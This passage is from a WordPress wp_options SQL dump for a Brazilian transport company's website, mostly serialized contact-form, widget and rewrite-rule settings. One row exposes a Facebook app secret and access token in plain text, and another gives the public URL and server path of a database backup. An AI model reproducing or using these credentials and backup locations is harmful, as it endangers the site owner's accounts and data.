:16:\"redirect_seconds\";i:1;s:12:\"redirect_url\";s:29:\"http://www.araujotrans.com.br\";s:14:\"redirect_query\";s:5:\"false\";s:15:\"redirect_ignore\";s:0:\"\";s:15:\"redirect_rename\";s:0:\"\";s:12:\"redirect_add\";s:0:\"\";s:18:\"redirect_email_off\";s:5:\"false\";s:11:\"silent_send\";s:3:\"off\";s:10:\"silent_url\";s:0:\"\";s:13:\"silent_ignore\";s:0:\"\";s:13:\"silent_rename\";s:0:\"\";s:10:\"silent_add\";s:0:\"\";s:24:\"silent_conditional_field\";s:0:\"\";s:24:\"silent_conditional_value\";s:0:\"\";s:16:\"silent_email_off\";s:5:\"false\";s:13:\"export_ignore\";s:0:\"\";s:13:\"export_rename\";s:0:\"\";s:10:\"export_add\";s:0:\"\";s:16:\"export_email_off\";s:5:\"false\";s:11:\"date_format\";s:10:\"dd/mm/yyyy\";s:13:\"cal_start_day\";s:1:\"0\";s:11:\"time_format\";s:2:\"24\";s:12:\"attach_types\";s:33:\"doc,docx,pdf,txt,gif,jpg,jpeg,png\";s:11:\"attach_size\";s:3:\"1mb\";s:19:\"textarea_html_allow\";s:5:\"false\";s:17:\"enable_areyousure\";s:5:\"false\";s:22:\"enable_submit_oneclick\";s:4:\"true\";s:19:\"auto_respond_enable\";s:5:\"false\";s:17:\"auto_respond_html\";s:5:\"false\";s:22:\"auto_respond_from_name\";s:19:\"Araújo Transportes\";s:23:\"auto_respond_from_email\";s:26:\"contato@araujotrans.com.br\";s:21:\"auto_respond_reply_to\";s:26:\"contato@araujotrans.com.br\";s:20:\"auto_respond_subject\";s:0:\"\";s:20:\"auto_respond_message\";s:0:\"\";s:26:\"req_field_indicator_enable\";s:5:\"false\";s:22:\"req_field_label_enable\";s:5:\"false\";s:19:\"req_field_indicator\";s:0:\"\";s:13:\"border_enable\";s:5:\"false\";s:14:\"external_style\";s:5:\"false\";s:13:\"aria_required\";s:5:\"false\";s:16:\"auto_fill_enable\";s:4:\"true\";s:15:\"form_attributes\";s:0:\"\";s:17:\"submit_attributes\";s:0:\"\";s:17:\"success_page_html\";s:0:\"\";s:12:\"title_border\";s:22:\"Formulário de Contato\";s:10:\"title_dept\";s:0:\"\";s:12:\"title_select\";s:0:\"\";s:10:\"title_name\";s:5:\"Nome:\";s:11:\"title_fname\";s:0:\"\";s:11:\"title_mname\";s:0:\"\";s:12:\"title_miname\";s:0:\"\";s:11:\"title_lname\";s:0:\"\";s:11:\"title_email\";s:7:\"E-mail:\";s:12:\"title_email2\";s:0:\"\";s:10:\"title_subj\";s:8:\"Assunto:\";s:10:\"title_mess\";s:9:\"Mensagem:\";s:10:\"title_capt\";s:0:\"\";s:12:\"title_submit\";s:0:\"\";s:16:\"title_submitting\";s:0:\"\";s:11:\"title_reset\";s:0:\"\";s:16:\"title_areyousure\";s:0:\"\";s:17:\"text_message_sent\";s:0:\"\";s:17:\"text_print_button\";s:0:\"\";s:16:\"tooltip_required\";s:0:\"\";s:15:\"tooltip_captcha\";s:0:\"\";s:15:\"tooltip_refresh\";s:0:\"\";s:17:\"tooltip_filetypes\";s:0:\"\";s:16:\"tooltip_filesize\";s:0:\"\";s:12:\"enable_reset\";s:5:\"false\";s:18:\"enable_credit_link\";s:5:\"false\";s:20:\"error_contact_select\";s:0:\"\";s:10:\"error_name\";s:0:\"\";s:11:\"error_email\";s:49:\"Um endereço de e-mail apropriado é necessário.\";s:17:\"error_email_check\";s:0:\"\";s:12:\"error_email2\";s:0:\"\";s:9:\"error_url\";s:0:\"\";s:10:\"error_date\";s:0:\"\";s:10:\"error_time\";s:0:\"\";s:12:\"error_maxlen\";s:0:\"\";s:11:\"error_field\";s:27:\"Este campo é obrigatório.\";s:13:\"error_subject\";s:42:\"A seleção de um assunto é obrigatório.\";s:12:\"error_select\";s:0:\"\";s:11:\"error_input\";s:0:\"\";s:19:\"error_captcha_blank\";s:0:\"\";s:19:\"error_captcha_wrong\";s:0:\"\";s:13:\"error_correct\";s:57:\"Por favor, faça as correções abaixo e tente novamente.\";s:13:\"error_spambot\";s:0:\"\";s:6:\"fields\";a:4:{i:0;a:21:{s:8:\"standard\";s:1:\"1\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:5:\"Name:\";s:4:\"slug\";s:9:\"full_name\";s:4:\"type\";s:4:\"text\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";s:6:\"delete\";s:5:\"false\";}i:1;a:21:{s:8:\"standard\";s:1:\"2\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:6:\"Email:\";s:4:\"slug\";s:5:\"email\";s:4:\"type\";s:4:\"text\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";s:6:\"delete\";s:5:\"false\";}i:2;a:21:{s:8:\"standard\";s:1:\"3\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:8:\"Subject:\";s:4:\"slug\";s:7:\"subject\";s:4:\"type\";s:4:\"text\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";s:6:\"delete\";s:5:\"false\";}i:3;a:21:{s:8:\"standard\";s:1:\"4\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:8:\"Message:\";s:4:\"slug\";s:7:\"message\";s:4:\"type\";s:8:\"textarea\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";s:6:\"delete\";s:5:\"false\";}}s:23:\"vcita_scheduling_button\";s:5:\"false\";s:29:\"vcita_scheduling_button_label\";s:24:\"Programar um compromisso\";s:14:\"vcita_approved\";s:4:\"true\";s:9:\"vcita_uid\";s:16:\"2e9d47f3cf9dbc73\";s:11:\"vcita_email\";s:26:\"contato@araujotrans.com.br\";s:15:\"vcita_email_new\";s:18:\"marjori@ywc.com.br\";s:19:\"vcita_confirm_token\";s:0:\"\";s:20:\"vcita_confirm_tokens\";s:0:\"\";s:17:\"vcita_initialized\";s:5:\"false\";s:16:\"vcita_first_name\";s:0:\"\";s:15:\"vcita_last_name\";s:0:\"\";s:10:\"form_style\";s:27:\"width:99%; max-width:555px;\";s:14:\"left_box_style\";s:39:\"float:left; width:55%; max-width:270px;\";s:15:\"right_box_style\";s:24:\"float:left; width:235px;\";s:11:\"clear_style\";s:11:\"clear:both;\";s:16:\"field_left_style\";s:70:\"clear:left; float:left; width:99%; max-width:550px; margin-right:10px;\";s:21:\"field_prefollow_style\";s:70:\"clear:left; float:left; width:99%; max-width:250px; margin-right:10px;\";s:18:\"field_follow_style\";s:58:\"float:left; padding-left:10px; width:99%; max-width:500px;\";s:11:\"title_style\";s:33:\"text-align:left; padding-top:5px;\";s:15:\"field_div_style\";s:16:\"text-align:left;\";s:20:\"captcha_div_style_sm\";s:42:\"width:175px; height:50px; padding-top:2px;\";s:19:\"captcha_div_style_m\";s:42:\"width:250px; height:65px; padding-top:2px;\";s:19:\"captcha_image_style\";s:72:\"border-style:none; margin:0; padding:0px; padding-right:5px; float:left;\";s:26:\"captcha_reload_image_style\";s:64:\"border-style:none; margin:0; padding:0px; vertical-align:bottom;\";s:16:\"submit_div_style\";s:46:\"text-align:left; clear:both; padding-top:15px;\";s:12:\"border_style\";s:65:\"border:1px solid black; width:99%; max-width:550px; padding:10px;\";s:14:\"required_style\";s:16:\"text-align:left;\";s:19:\"required_text_style\";s:16:\"text-align:left;\";s:10:\"hint_style\";s:38:\"font-size:x-small; font-weight:normal;\";s:11:\"error_style\";s:27:\"text-align:left; color:red;\";s:14:\"redirect_style\";s:16:\"text-align:left;\";s:14:\"fieldset_style\";s:65:\"border:1px solid black; width:97%; max-width:500px; padding:10px;\";s:11:\"label_style\";s:16:\"text-align:left;\";s:18:\"option_label_style\";s:15:\"display:inline;\";s:11:\"field_style\";s:54:\"text-align:left; margin:0; width:99%; max-width:500px;\";s:19:\"captcha_input_style\";s:38:\"text-align:left; margin:0; width:50px;\";s:14:\"textarea_style\";s:68:\"text-align:left; margin:0; width:99%; max-width:500px; height:120px;\";s:12:\"select_style\";s:16:\"text-align:left;\";s:14:\"checkbox_style\";s:11:\"width:13px;\";s:11:\"radio_style\";s:11:\"width:13px;\";s:17:\"placeholder_style\";s:27:\"opacity:0.6; color:#333333;\";s:12:\"button_style\";s:25:\"cursor:pointer; margin:0;\";s:11:\"reset_style\";s:25:\"cursor:pointer; margin:0;\";s:18:\"vcita_button_style\";s:156:\"text-decoration:none; display:block; text-align:center; background:linear-gradient(to bottom, #ed6a31 0%, #e55627 100%); color:#fff !important; padding:8px;\";s:22:\"vcita_div_button_style\";s:63:\"border-left:1px dashed #ccc; margin-top:25px; padding:8px 20px;\";s:16:\"powered_by_style\";s:74:\"font-size:x-small; font-weight:normal; padding-top:5px; text-align:center;\";s:10:\"vcita_link\";s:5:\"false\";s:26:\"vcita_scheduling_link_text\";s:69:\"Clique acima para agendar uma consulta usando Scheduling vCita online\";s:19:\"vcita_changed_email\";s:0:\"\";s:19:\"ex_fields_after_msg\";s:5:\"false\";}', 'yes'),
(665, 'dropb_autho', 'no', 'yes'),
(685, 'widget_spacious_service_widget', 'a:2:{i:2;a:6:{s:8:\"page_id0\";i:26;s:8:\"page_id1\";i:91;s:8:\"page_id2\";i:96;s:8:\"page_id3\";i:0;s:8:\"page_id4\";i:0;s:8:\"page_id5\";i:0;}s:12:\"_multiwidget\";i:1;}', 'yes'),
(737, 'widget_pages', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(750, 'widget_spacious_call_to_action_widget', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(872, 'widget_facebook-like-box', 'a:1:{s:12:\"_multiwidget\";i:1;}', 'yes'),
(1131, 'wp_db_backup_backups', 'a:1:{i:0;a:7:{s:4:\"date\";i:1460382753;s:8:\"filename\";s:58:\"Ara__jo_Transportes_2016_04_11_14603827534511_database.zip\";s:3:\"url\";s:117:\"http://www.araujotrans.com.br/wp-content/uploads/db-backup/Ara__jo_Transportes_2016_04_11_14603827534511_database.zip\";s:3:\"dir\";s:124:\"/home/comywc/public_html/araujotrans/wp-content/uploads/db-backup/Ara__jo_Transportes_2016_04_11_14603827534511_database.zip\";s:3:\"log\";s:0:\"\";s:7:\"sqlfile\";s:124:\"/home/comywc/public_html/araujotrans/wp-content/uploads/db-backup/Ara__jo_Transportes_2016_04_11_14603827534511_database.sql\";s:4:\"size\";i:134646;}}', 'yes'),
(1132, 'wp_db_backup_options', '', 'yes'),
(1141, 'fs_contact_form2', 'a:173:{s:9:\"form_name\";s:8:\"New Form\";s:7:\"welcome\";s:49:\"<p>Comentários ou perguntas são bem-vindos.</p>\";s:15:\"after_form_note\";s:0:\"\";s:8:\"email_to\";s:28:\"Webmaster,marjori@ywc.com.br\";s:17:\"php_mailer_enable\";s:9:\"wordpress\";s:10:\"email_from\";s:0:\"\";s:19:\"email_from_enforced\";s:5:\"false\";s:14:\"email_reply_to\";s:0:\"\";s:9:\"email_bcc\";s:0:\"\";s:13:\"email_subject\";s:28:\"Araújo Transportes Contact:\";s:18:\"email_subject_list\";s:0:\"\";s:11:\"name_format\";s:4:\"name\";s:21:\"preserve_space_enable\";s:5:\"false\";s:12:\"double_email\";s:5:\"false\";s:16:\"name_case_enable\";s:5:\"false\";s:18:\"sender_info_enable\";s:4:\"true\";s:14:\"domain_protect\";s:4:\"true\";s:20:\"domain_protect_names\";s:0:\"\";s:13:\"anchor_enable\";s:4:\"true\";s:15:\"email_check_dns\";s:5:\"false\";s:16:\"email_check_easy\";s:5:\"false\";s:10:\"email_html\";s:5:\"false\";s:18:\"email_inline_label\";s:5:\"false\";s:16:\"email_hide_empty\";s:5:\"false\";s:17:\"print_form_enable\";s:5:\"false\";s:22:\"email_keep_attachments\";s:5:\"false\";s:15:\"akismet_disable\";s:5:\"false\";s:19:\"akismet_send_anyway\";s:4:\"true\";s:14:\"captcha_enable\";s:4:\"true\";s:13:\"captcha_small\";s:5:\"false\";s:12:\"captcha_perm\";s:5:\"false\";s:18:\"captcha_perm_level\";s:4:\"read\";s:16:\"recaptcha_enable\";s:5:\"false\";s:14:\"recaptcha_dark\";s:5:\"false\";s:15:\"honeypot_enable\";s:5:\"false\";s:15:\"redirect_enable\";s:4:\"true\";s:16:\"redirect_seconds\";i:3;s:12:\"redirect_url\";s:25:\"http://araujotrans.com.br\";s:14:\"redirect_query\";s:5:\"false\";s:15:\"redirect_ignore\";s:0:\"\";s:15:\"redirect_rename\";s:0:\"\";s:12:\"redirect_add\";s:0:\"\";s:18:\"redirect_email_off\";s:5:\"false\";s:11:\"silent_send\";s:3:\"off\";s:10:\"silent_url\";s:0:\"\";s:13:\"silent_ignore\";s:0:\"\";s:13:\"silent_rename\";s:0:\"\";s:10:\"silent_add\";s:0:\"\";s:24:\"silent_conditional_field\";s:0:\"\";s:24:\"silent_conditional_value\";s:0:\"\";s:16:\"silent_email_off\";s:5:\"false\";s:13:\"export_ignore\";s:0:\"\";s:13:\"export_rename\";s:0:\"\";s:10:\"export_add\";s:0:\"\";s:16:\"export_email_off\";s:5:\"false\";s:11:\"date_format\";s:10:\"mm/dd/yyyy\";s:13:\"cal_start_day\";s:1:\"0\";s:11:\"time_format\";s:2:\"12\";s:12:\"attach_types\";s:33:\"doc,docx,pdf,txt,gif,jpg,jpeg,png\";s:11:\"attach_size\";s:3:\"1mb\";s:19:\"textarea_html_allow\";s:5:\"false\";s:17:\"enable_areyousure\";s:5:\"false\";s:22:\"enable_submit_oneclick\";s:4:\"true\";s:19:\"auto_respond_enable\";s:5:\"false\";s:17:\"auto_respond_html\";s:5:\"false\";s:22:\"auto_respond_from_name\";s:19:\"Araújo Transportes\";s:23:\"auto_respond_from_email\";s:18:\"marjori@ywc.com.br\";s:21:\"auto_respond_reply_to\";s:18:\"marjori@ywc.com.br\";s:20:\"auto_respond_subject\";s:0:\"\";s:20:\"auto_respond_message\";s:0:\"\";s:26:\"req_field_indicator_enable\";s:4:\"true\";s:22:\"req_field_label_enable\";s:4:\"true\";s:19:\"req_field_indicator\";s:1:\"*\";s:13:\"border_enable\";s:5:\"false\";s:14:\"external_style\";s:5:\"false\";s:13:\"aria_required\";s:5:\"false\";s:16:\"auto_fill_enable\";s:4:\"true\";s:15:\"form_attributes\";s:0:\"\";s:17:\"submit_attributes\";s:0:\"\";s:17:\"success_page_html\";s:0:\"\";s:12:\"title_border\";s:22:\"Formulário de Contato\";s:10:\"title_dept\";s:0:\"\";s:12:\"title_select\";s:0:\"\";s:10:\"title_name\";s:0:\"\";s:11:\"title_fname\";s:0:\"\";s:11:\"title_mname\";s:0:\"\";s:12:\"title_miname\";s:0:\"\";s:11:\"title_lname\";s:0:\"\";s:11:\"title_email\";s:0:\"\";s:12:\"title_email2\";s:0:\"\";s:10:\"title_subj\";s:0:\"\";s:10:\"title_mess\";s:0:\"\";s:10:\"title_capt\";s:0:\"\";s:12:\"title_submit\";s:0:\"\";s:16:\"title_submitting\";s:0:\"\";s:11:\"title_reset\";s:0:\"\";s:16:\"title_areyousure\";s:0:\"\";s:17:\"text_message_sent\";s:0:\"\";s:17:\"text_print_button\";s:0:\"\";s:16:\"tooltip_required\";s:0:\"\";s:15:\"tooltip_captcha\";s:0:\"\";s:15:\"tooltip_refresh\";s:0:\"\";s:17:\"tooltip_filetypes\";s:0:\"\";s:16:\"tooltip_filesize\";s:0:\"\";s:12:\"enable_reset\";s:5:\"false\";s:18:\"enable_credit_link\";s:5:\"false\";s:20:\"error_contact_select\";s:0:\"\";s:10:\"error_name\";s:0:\"\";s:11:\"error_email\";s:0:\"\";s:17:\"error_email_check\";s:0:\"\";s:12:\"error_email2\";s:0:\"\";s:9:\"error_url\";s:0:\"\";s:10:\"error_date\";s:0:\"\";s:10:\"error_time\";s:0:\"\";s:12:\"error_maxlen\";s:0:\"\";s:11:\"error_field\";s:0:\"\";s:13:\"error_subject\";s:0:\"\";s:12:\"error_select\";s:0:\"\";s:11:\"error_input\";s:0:\"\";s:19:\"error_captcha_blank\";s:0:\"\";s:19:\"error_captcha_wrong\";s:0:\"\";s:13:\"error_correct\";s:0:\"\";s:13:\"error_spambot\";s:0:\"\";s:6:\"fields\";a:4:{i:0;a:20:{s:8:\"standard\";s:1:\"1\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:5:\"Name:\";s:4:\"slug\";s:9:\"full_name\";s:4:\"type\";s:4:\"text\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";}i:1;a:20:{s:8:\"standard\";s:1:\"2\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:6:\"Email:\";s:4:\"slug\";s:5:\"email\";s:4:\"type\";s:4:\"text\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";}i:2;a:20:{s:8:\"standard\";s:1:\"3\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:8:\"Subject:\";s:4:\"slug\";s:7:\"subject\";s:4:\"type\";s:4:\"text\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";}i:3;a:20:{s:8:\"standard\";s:1:\"4\";s:7:\"options\";s:0:\"\";s:7:\"default\";s:0:\"\";s:6:\"inline\";s:5:\"false\";s:3:\"req\";s:4:\"true\";s:7:\"disable\";s:5:\"false\";s:6:\"follow\";s:5:\"false\";s:10:\"hide_label\";s:5:\"false\";s:11:\"placeholder\";s:5:\"false\";s:5:\"label\";s:8:\"Message:\";s:4:\"slug\";s:7:\"message\";s:4:\"type\";s:8:\"textarea\";s:7:\"max_len\";s:0:\"\";s:9:\"label_css\";s:0:\"\";s:9:\"input_css\";s:0:\"\";s:10:\"attributes\";s:0:\"\";s:5:\"regex\";s:0:\"\";s:11:\"regex_error\";s:0:\"\";s:5:\"notes\";s:0:\"\";s:11:\"notes_after\";s:0:\"\";}}s:23:\"vcita_scheduling_button\";s:5:\"false\";s:29:\"vcita_scheduling_button_label\";s:23:\"Schedule an Appointment\";s:14:\"vcita_approved\";s:5:\"false\";s:9:\"vcita_uid\";s:0:\"\";s:11:\"vcita_email\";s:0:\"\";s:15:\"vcita_email_new\";s:18:\"marjori@ywc.com.br\";s:19:\"vcita_confirm_token\";s:0:\"\";s:20:\"vcita_confirm_tokens\";s:0:\"\";s:17:\"vcita_initialized\";s:5:\"false\";s:16:\"vcita_first_name\";s:0:\"\";s:15:\"vcita_last_name\";s:0:\"\";s:10:\"form_style\";s:27:\"width:99%; max-width:555px;\";s:14:\"left_box_style\";s:39:\"float:left; width:55%; max-width:270px;\";s:15:\"right_box_style\";s:24:\"float:left; width:235px;\";s:11:\"clear_style\";s:11:\"clear:both;\";s:16:\"field_left_style\";s:70:\"clear:left; float:left; width:99%; max-width:550px; margin-right:10px;\";s:21:\"field_prefollow_style\";s:70:\"clear:left; float:left; width:99%; max-width:250px; margin-right:10px;\";s:18:\"field_follow_style\";s:58:\"float:left; padding-left:10px; width:99%; max-width:250px;\";s:11:\"title_style\";s:33:\"text-align:left; padding-top:5px;\";s:15:\"field_div_style\";s:16:\"text-align:left;\";s:20:\"captcha_div_style_sm\";s:42:\"width:175px; height:50px; padding-top:2px;\";s:19:\"captcha_div_style_m\";s:42:\"width:250px; height:65px; padding-top:2px;\";s:19:\"captcha_image_style\";s:72:\"border-style:none; margin:0; padding:0px; padding-right:5px; float:left;\";s:26:\"captcha_reload_image_style\";s:64:\"border-style:none; margin:0; padding:0px; vertical-align:bottom;\";s:16:\"submit_div_style\";s:46:\"text-align:left; clear:both; padding-top:15px;\";s:12:\"border_style\";s:65:\"border:1px solid black; width:99%; max-width:550px; padding:10px;\";s:14:\"required_style\";s:16:\"text-align:left;\";s:19:\"required_text_style\";s:16:\"text-align:left;\";s:10:\"hint_style\";s:38:\"font-size:x-small; font-weight:normal;\";s:11:\"error_style\";s:27:\"text-align:left; color:red;\";s:14:\"redirect_style\";s:16:\"text-align:left;\";s:14:\"fieldset_style\";s:65:\"border:1px solid black; width:97%; max-width:500px; padding:10px;\";s:11:\"label_style\";s:16:\"text-align:left;\";s:18:\"option_label_style\";s:15:\"display:inline;\";s:11:\"field_style\";s:54:\"text-align:left; margin:0; width:99%; max-width:250px;\";s:19:\"captcha_input_style\";s:38:\"text-align:left; margin:0; width:50px;\";s:14:\"textarea_style\";s:68:\"text-align:left; margin:0; width:99%; max-width:250px; height:120px;\";s:12:\"select_style\";s:16:\"text-align:left;\";s:14:\"checkbox_style\";s:24:\"width:22px; height:32px;\";s:11:\"radio_style\";s:24:\"width:22px; height:32px;\";s:17:\"placeholder_style\";s:27:\"opacity:0.6; color:#333333;\";s:12:\"button_style\";s:25:\"cursor:pointer; margin:0;\";s:11:\"reset_style\";s:25:\"cursor:pointer; margin:0;\";s:18:\"vcita_button_style\";s:156:\"text-decoration:none; display:block; text-align:center; background:linear-gradient(to bottom, #ed6a31 0%, #e55627 100%); color:#fff !important; padding:8px;\";s:22:\"vcita_div_button_style\";s:63:\"border-left:1px dashed #ccc; margin-top:25px; padding:8px 20px;\";s:16:\"powered_by_style\";s:74:\"font-size:x-small; font-weight:normal; padding-top:5px; text-align:center;\";s:10:\"vcita_link\";s:5:\"false\";s:26:\"vcita_scheduling_link_text\";s:68:\"Click above to schedule an appointment using vCita Online Scheduling\";s:19:\"ex_fields_after_msg\";s:5:\"false\";}', 'yes'),
(1288, 'facebook_application', 'a:4:{s:6:\"app_id\";s:15:\"360755527450778\";s:10:\"app_secret\";s:32:\"1fab7852c459d250ecd7cba5bae614cf\";s:12:\"access_token\";s:43:\"360755527450778|1SI117lnDu5aB1p0Z0nr99OzosQ\";s:15:\"appsecret_proof\";s:64:\"b9a30c6fa15c85ec1f1de8e26ec3d4aaeb8f3ef949c97eb86305e08e286a4772\";}', 'yes'),
(5051, 'finished_splitting_shared_terms', '1', 'yes'),
(5061, 'widget_calendar', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5062, 'widget_facebook-follow', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5063, 'widget_facebook-like', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5064, 'widget_facebook-activity-feed', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5065, 'widget_facebook-recommendations', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5066, 'widget_facebook-send', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5067, 'widget_huge_it_google_maps_widget', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5068, 'widget_nav_menu', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5069, 'widget_tag_cloud', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5070, 'widget_spacious_featured_single_page_widget', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5071, 'widget_spacious_recent_work_widget', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(5072, 'widget_spacious_testimonial_widget', 'a:2:{i:1;a:0:{}s:12:\"_multiwidget\";i:1;}', 'yes'),
(8292, 'site_icon', '0', 'yes'),
(8293, 'medium_large_size_w', '768', 'yes'),
(8294, 'medium_large_size_h', '0', 'yes'),
(8297, 'rewrite_rules', 'a:88:{s:11:\"^wp-json/?$\";s:22:\"index.php?rest_route=/\";s:14:\"^wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:21:\"^index.php/wp-json/?$\";s:22:\"index.php?rest_route=/\";s:24:\"^index.php/wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:47:\"category/(.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:42:\"category/(.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:23:\"category/(.+?)/embed/?$\";s:46:\"index.php?category_name=$matches[1]&embed=true\";s:35:\"category/(.+?)/page/?([0-9]{1,})/?$\";s:53:\"index.php?category_name=$matches[1]&paged=$matches[2]\";s:17:\"category/(.+?)/?$\";s:35:\"index.php?category_name=$matches[1]\";s:44:\"tag/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:39:\"tag/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:20:\"tag/([^/]+)/embed/?$\";s:36:\"index.php?tag=$matches[1]&embed=true\";s:32:\"tag/([^/]+)/page/?([0-9]{1,})/?$\";s:43:\"index.php?tag=$matches[1]&paged=$matches[2]\";s:14:\"tag/([^/]+)/?$\";s:25:\"index.php?tag=$matches[1]\";s:45:\"type/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:40:\"type/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:21:\"type/([^/]+)/embed/?$\";s:44:\"index.php?post_format=$matches[1]&embed=true\";s:33:\"type/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?post_format=$matches[1]&paged=$matches[2]\";s:15:\"type/([^/]+)/?$\";s:33:\"index.php?post_format=$matches[1]\";s:12:\"robots\\.txt$\";s:18:\"index.php?robots=1\";s:48:\".*wp-(atom|rdf|rss|rss2|feed|commentsrss2)\\.php$\";s:18:\"index.php?feed=old\";s:20:\".*wp-app\\.php(/.*)?$\";s:19:\"index.php?error=403\";s:18:\".*wp-register.php$\";s:23:\"index.php?register=true\";s:32:\"feed/(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:27:\"(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:8:\"embed/?$\";s:21:\"index.php?&embed=true\";s:20:\"page/?([0-9]{1,})/?$\";s:28:\"index.php?&paged=$matches[1]\";s:27:\"comment-page-([0-9]{1,})/?$\";s:39:\"index.php?&page_id=46&cpage=$matches[1]\";s:41:\"comments/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.ph